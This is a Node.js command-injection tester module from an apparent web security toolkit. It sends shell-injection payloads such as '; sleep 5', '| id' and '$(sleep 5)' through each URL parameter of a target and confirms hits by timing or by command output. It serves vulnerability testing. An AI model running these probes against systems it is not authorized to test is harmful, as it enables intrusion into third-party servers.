#!/usr/bin/env node
'use strict';
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: command-injection-tester.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */




const axios = require('axios');
const { getModuleById } = require('../lib/module-catalog');
const { parseArgs } = require('../lib/module-runner');
const { HttpHistoryLogger } = require('../utils/http-history-logger');

const definition = getModuleById('vuln-probes/command-injection-tester');
const historyLogger = new HttpHistoryLogger();

async function run(argv = process.argv) {
  const { flags } = parseArgs(argv.slice(2));
  const url = flags.url;

  if (!url) {
    console.log(`Usage: node ${definition.filePath} --url <target-url-with-params>`);
    return;
  }

  const parsedUrl = new URL(url);
  const params = Array.from(parsedUrl.searchParams.keys());

  if (params.length === 0) {
    console.log('[-] No parameters found in URL to fuzz.');
    return;
  }

  console.log(`[*] Probing OS Command Injection on ${url} across ${params.length} parameters...`);
  const findings = [];
  const cmdPayloads = [
    { payload: '; sleep 5', description: 'Semicolon sleep' },
    { payload: '| sleep 5', description: 'Pipe sleep' },
    { payload: '& sleep 5', description: 'Ampersand sleep' },
    { payload: '`sleep 5`', description: 'Backtick sleep' },
    { payload: '$(sleep 5)', description: 'Substitution sleep' },
    { payload: '; whoami', description: 'Direct whoami' },
    { payload: '| id', description: 'Direct id' }
  ];

  for (const param of params) {
    for (const p of cmdPayloads) {
      const fuzzUrl = new URL(url);
      fuzzUrl.searchParams.set(param, p.payload);

      try {
        const startTime = Date.now();
        const response = await axios.get(fuzzUrl.toString(), {
          timeout: 10000,
          validateStatus: () => true
        });
        const duration = Date.now() - startTime;

        historyLogger.logRequest({
          tool: definition.id,
          method: 'GET',
          url: fuzzUrl.toString(),
          requestHeaders: {},
          statusCode: response.status,
          responseHeaders: response.headers,
          responseBody: typeof response.data === 'string' ? response.data : JSON.stringify(response.data),
          durationMs: duration
        });

        const bodyStr = String(response.data || '').toLowerCase();
        let confirmed = false;

        if (p.payload.includes('sleep') && duration >= 5000 && duration < 7000) confirmed = true;
        if (p.payload.includes('whoami') && (bodyStr.includes('root') || bodyStr.includes('www-data'))) confirmed = true;
        if (p.payload.includes('id') && bodyStr.includes('uid=')) confirmed = true;

        if (confirmed) {
          findings.push({
            title: `Potential Command Injection (${p.description})`,
            severity: 'Critical',
            target: fuzzUrl.toString(),
            tool: definition.id,
            cvss: '9.8',
            evidence: {
              request: `GET ${fuzzUrl.toString()}`,
              response: `Duration: ${duration}ms\nBody Snippet: ${bodyStr.slice(0, 500)}`
            },
            remediation: 'Avoid executing system commands based on user input. Use safe API alternatives (e.g., native library functions) instead of shell execution. Implement a strict whitelist of allowed inputs.'
          });
          console.log(`[!] CRITICAL COMMAND INJECTION: ${fuzzUrl.toString()} (Duration: ${duration}ms)`);
          break;
        }
      } catch (err) {
        // Handle timeout
      }
    }
  }

  if (findings.length > 0) {
    console.log(`[+] Found ${findings.length} Command Injection issues!`);
    process.stdout.write(JSON.stringify(findings, null, 2) + '\n');
  } else {
    console.log('[-] No command injection detected via simple probing.');
  }

  return findings;
}

if (require.main === module) {
  run().catch(console.error);
}

module.exports = { run };
